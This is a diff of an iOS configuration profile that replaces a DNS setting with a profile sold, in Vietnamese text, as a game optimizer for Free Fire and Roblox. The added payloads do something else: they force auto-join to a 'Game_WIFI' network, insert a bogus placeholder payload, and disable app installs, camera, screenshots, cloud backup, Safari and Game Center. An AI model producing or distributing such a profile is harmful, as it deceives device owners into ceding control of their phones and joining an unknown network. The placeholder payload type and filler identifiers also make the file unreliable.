@@ -3,44 +3,94 @@
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
+  <key>PayloadType</key>
+  <string>Configuration</string>
+  <key>PayloadVersion</key>
+  <integer>1</integer>
+  <key>PayloadIdentifier</key>
+  <string>com.hieu.game.optimize</string>
+  <key>PayloadUUID</key>
+  <string>9E3C6D5E-9C1B-40B5-833D-1234567890AB</string>
+  <key>PayloadDisplayName</key>
+  <string>Tối Ưu Game - Hiếu Dev</string>
+  <key>PayloadDescription</key>
+  <string>Tối ưu hóa thiết bị để chơi game mượt hơn (Free Fire, Roblox, v.v).</string>
+  <key>ConsentText</key>
+  <dict>
+    <key>default</key>
+    <string>Bạn đồng ý cài đặt cấu hình tối ưu thiết bị để giảm lag và tiết kiệm pin khi chơi game.</string>
+  </dict>
   <key>PayloadContent</key>
   <array>
+
+    <!-- 1. Cấu hình Wi-Fi -->
     <dict>
       <key>PayloadType</key>
-      <string>com.apple.dnsSettings.managed</string>
+      <string>com.apple.wifi.managed</string>
       <key>PayloadVersion</key>
       <integer>1</integer>
       <key>PayloadIdentifier</key>
-      <string>com.vng.optimize.dns</string>
+      <string>com.hieu.wifi</string>
       <key>PayloadUUID</key>
-      <string>1111-aaaa-dns-0001</string>
+      <string>2A1B2C3D-4E5F-6789-AAAA-BBBBBBBBBBBB</string>
       <key>PayloadDisplayName</key>
-      <string>DNS 1.1.1.1 - Optimize</string>
-      <key>DNSSettings</key>
-      <dict>
-        <key>DNS</key>
-        <array>
-          <string>1.1.1.1</string>
-          <string>1.0.0.1</string>
-        </array>
-        <key>SupplementalMatchDomains</key>
-        <array>
-          <string></string>
-        </array>
-      </dict>
+      <string>Wi-Fi Game</string>
+      <key>SSID_STR</key>
+      <string>Game_WIFI</string>
+      <key>AutoJoin</key>
+      <true/>
+      <key>EncryptionType</key>
+      <string>WPA</string>
+      <key>Password</key>
+      <string>12345678</string>
     </dict>
+
+    <!-- 2. Dữ liệu không xác định (dummy) -->
+    <dict>
+      <key>PayloadType</key>
+      <string>com.apple.dummy.data</string>
+      <key>PayloadVersion</key>
+      <integer>1</integer>
+      <key>PayloadIdentifier</key>
+      <string>com.hieu.unknown.data</string>
+      <key>PayloadUUID</key>
+      <string>DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF</string>
+      <key>PayloadDisplayName</key>
+      <string>Dữ liệu không xác định</string>
+      <key>PayloadDescription</key>
+      <string>Chứa thông tin placeholder.</string>
+    </dict>
+
+    <!-- 3.–10. Giới hạn (Restrictions) -->
+    <dict>
+      <key>PayloadType</key>
+      <string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key>
+      <integer>1</integer>
+      <key>PayloadIdentifier</key>
+      <string>com.hieu.restrictions</string>
+      <key>PayloadUUID</key>
+      <string>11223344-5566-7788-99AA-BBCCDDEEFF00</string>
+      <key>PayloadDisplayName</key>
+      <string>Giới hạn Game</string>
+      <key>allowAppInstallation</key>
+      <false/>
+      <key>allowCamera</key>
+      <false/>
+      <key>allowScreenShot</key>
+      <false/>
+      <key>allowCloudBackup</key>
+      <false/>
+      <key>allowCloudDocumentSync</key>
+      <false/>
+      <key>allowVoiceDialing</key>
+      <false/>
+      <key>allowGameCenter</key>
+      <false/>
+      <key>allowSafari</key>
+      <false/>
+    </dict>
+
   </array>
-  <key>PayloadDisplayName</key>
-  <string>VNG Optimize Config</string>
-  <key>PayloadIdentifier</key>
-  <string>com.vng.optimize</string>
-  <key>PayloadRemovalDisallowed</key>
-  <false/>
-  <key>PayloadType</key>
-  <string>Configuration</string>
-  <key>PayloadUUID</key>
-  <string>vng-optimize-0001</string>
-  <key>PayloadVersion</key>
-  <integer>1</integer>
 </dict>
 </plist>
